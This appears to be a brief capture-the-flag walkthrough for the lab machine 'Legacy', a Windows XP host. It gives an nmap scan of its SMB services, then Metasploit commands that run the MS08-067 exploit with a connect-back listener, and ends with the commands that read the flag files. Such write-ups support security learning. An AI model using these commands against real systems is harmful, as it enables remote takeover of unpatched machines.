

# Nmap Scan Report

- **IP Address:** 10.10.10.4
- **Host is up:** 0.069s latency

---

## Open Ports

| PORT | STATE | SERVICE      | VERSION                   |
|------|-------|--------------|---------------------------|
| 135/tcp | open  | msrpc        | Microsoft Windows RPC     |
| 139/tcp | open  | netbios-ssn  | Microsoft Windows netbios-ssn |
| 445/tcp | open  | microsoft-ds | Windows XP microsoft-ds   |

- **Service Info:** OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

---

## Host Script Results

- **smb2-time:**
  - Protocol negotiation failed (SMB2)

- **smb-os-discovery:**
  - OS: Windows XP (Windows 2000 LAN Manager)
  - Computer name: legacy
  - NetBIOS computer name: LEGACY\x00
  - Workgroup: HTB\x00
  - System time: 2024-06-22T14:34:22+03:00

- **nbstat:**
  - NetBIOS name: LEGACY
  - NetBIOS MAC: 00:50:56:b9:04:ef (VMware)

- **smb-security-mode:**
  - Account used: guest
  - Authentication level: user
  - Challenge response: supported
  - Message signing: disabled (dangerous, but default)

- **clock-skew:**
  - Mean: 5d00h20m54s
  - Deviation: 2h07m16s
  - Median: 4d22h50m54s

---

Nmap done: 1 IP address (1 host up) scanned in 25.06 seconds

---

### Vuln MS08-067 Microsoft Server Service Relative Path Stack Corruption


```bash
	msfconsole
	use exploit/windows/smb/ms08_067_netapi
	set rhosts {IP}
	set lhost tun0
	exploit
```



#### FILE flag root.txt dan user.txt

###### user.txt 
	C:\Documents and Settings\john\Desktop> type user.txt

###### root.txt
	C:\Documents and Settings\Administrator\Desktop> type root.txt
